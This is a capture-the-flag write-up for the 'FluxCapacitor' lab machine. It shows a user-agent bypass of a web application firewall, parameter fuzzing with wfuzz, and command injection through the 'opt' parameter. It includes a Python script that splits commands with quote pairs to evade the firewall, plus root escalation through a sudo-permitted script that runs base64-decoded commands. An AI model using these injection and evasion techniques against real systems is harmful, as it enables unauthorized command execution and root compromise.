# FluxCapacitor
### 10.10.10.69

Let's run a basic Nmap scan:
```{r, engine='bash', count_lines}
Nmap scan report for 10.10.10.69
Host is up (0.077s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.5p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    SuperWAF
```

We see OpenSSH, which is not a common attack vector unless its very old, and an HTTP web-server called "SuperWAF" we can already assume there is some kind of WAF (Web Application Firewall) in place that will make our life harder.
If we open up the Website we can see a simple html website with some references to the Back To The Future Trilogy, but, in the source of the page we find something peculiar:
```{r, engine='javascript'}
<!--
		Please, add timestamp with something like:
		<script> $.ajax({ type: "GET", url: '/sync' }); </script>
-->
```

the source tells us there's a page over at /sync which returns a timestamp with a get request.
if we browse over to /sync we get a 403 Forbidden error, it might be the WAF! some common ways for WAFs to block users is by checking the user agent for normal Operating Systems and Web Browsers, so if we change our useragent to a random string like 'hello', Great Scott! we get a timestamp:
```
20171219T11:30:25
```

but that's not very useful is it, what we do know though is that there is some kind of script here(which most of the time are ran on perl or php) which returns the timestamp every time we send a get request to it.
most of these scripts do a lot more than just send back the timestamp, so lets check for common options for accepting user input through get requests, but if we try to access /sync?cmd=/etc/passwd or /sync?c=/etc/passwd we get a 200 response with the timestamp every time. but! we have a WAF in place, which will block running commands like cat /etc/passwd if we do manage to get command execution, so if we find a GET argument which will return a 403 Forbidden, we will find a vulnerable variable.

So lets boot up WFUZZ(a tool which will allow us to run many requests with one part of the url changed, in this case the variable name), and run it with the dirbuster common dirs and files wordlist:
```{r, engine='bash', count_lines}
> wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 200 http://fluxcapacitor.htb/sync/?FUZZ=/etc/passwd
..snip..
10703:  C=403      7 L	      10 W	    175 Ch	  "opt"
..snip..
```

we can see that only one variable returns a 403 the opt variable! that's it! we got it!
now that we found a variable which probably runs commands directly, we must find a way to evade the WAF which blocks our requests. A common way for WAF's to filter requests is: If request includes "etc,cat,bin...." then block();
so lets try to make sure that out requests don't have any of those characters near each other, an easy way to do that, is just separating every character with a '' to a different string, and then letting the script itself concatenate them together when running them.
so if we send a request with opt=' l''s' (notice the space at the first letter, as by the errors we get if we try to run it without a space, its running bash -c"our command" so without a space, it wouldn't run)... HUZZAH! we get a list of files back.

```{r, engine='bash', count_lines}
> curl 10.10.10.69/sync?opt="' l''s'"
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
swapfile
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

but this is a little messy, and once we get to longer command it will become a tiring proccess to add all of those apostrophes to the command, so lets create a small python script to help us.
```{r, engine='python', count_lines}
import re
import sys
import pycurl
from StringIO import StringIO
s = sys.argv[1]
escaped = re.sub("(.{1})", "\\1''", s, 0, re.DOTALL)
buffer = StringIO()
c = pycurl.Curl()
url = "http://10.10.10.69/sync?opt=\' " + escaped + "\'"
c.setopt(c.URL, url)
c.setopt(c.WRITEDATA, buffer)
c.perform()
c.close()
body = buffer.getvalue()
print(body)
```

and we can now use it to run commands on the server, but, if we try to read the user.txt file in themiddle's home directory we only get a Back To The Future reference:
```{r, engine='bash', count_lines}
> python flux.py "cat home/themiddle/user.txt"
Flags? Where we're going we don't need flags.
```

if we keep poking around, we will find there is another home directory, for the "FluxCapacitorInc" user which includes another user.txt inside, this time with the user hash!
```{r, engine='bash', count_lines}
> python flux.py "cat home/FluxCapacitorInc/user.txt"
b8b6d46c893d0cd00c0f0380036117bc
```

but that's not enough, we need the root.txt file, but we dont have permissions to look in the root.txt directory as we're not root. Let's check what programs we are allowed to run as root:
```{r, engine='bash', count_lines}
> python flux.py "sudo -l"
Matching Defaults entries for nobody on fluxcapacitor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nobody may run the following commands on fluxcapacitor:
    (ALL) ALL
    (root) NOPASSWD: /home/themiddle/.monit
```

Hmm, we are allowed to run a curious program called ".monit" in themiddle's home directory, if we check its content we find:
```{r, engine='bash', count_lines}
> python flux.py "cat /home/themiddle/.monit"
#!/bin/bash

if [ "$1" == "cmd" ]; then
	echo "Trying to execute ${2}"
	CMD=$(echo -n ${2} | base64 -d)
	bash -c "$CMD"
fi
```

Great! it seems like it will run any base64 encoded command we will send it.. as root! (as long as we pass it the "cmd" argument first) so lets try to copy the root.txt content's into a file we can read, so firstly we encode it into base64:
```{r, engine='bash', count_lines}
> echo 'cat /root/root.txt > /tmp/root.txt' | base64
Y2F0IC9yb290L3Jvb3QudHh0ID4gL3RtcC9yb290LnR4dAo=
```

then we run the monit program as root with the appropriate arguments:
```{r, engine='bash', count_lines}
> python flux.py "sudo -u root /home/themiddle/.monit cmd Y2F0IC9yb290L3Jvb3QudHh0ID4gL3RtcC9yb290LnR4dAo="
Trying to execute Y2F0IC9yb290L3Jvb3QudHh0ID4gL3RtcC9yb290LnR4dAo=
```

and then we will read it!
```{r, engine='bash', count_lines}
> python flux.py "cat /tmp/root.txt"
bdc89b40eda244649072189a8438b30e
```

and we got rootz!
